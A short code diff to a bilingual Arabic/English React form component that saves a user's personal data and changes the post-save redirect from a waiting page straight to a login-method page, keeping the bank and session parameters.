@@ -73,7 +73,7 @@ export default function PersonalData() {
         customerStatus: formData.customerStatus,
       });
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=login-method`);
+      setLocation(`/login-method?bank=${bank}&session=${currentSessionId}`);
     } catch (error) {
       console.error("Error saving personal data in DB:", error);
       toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
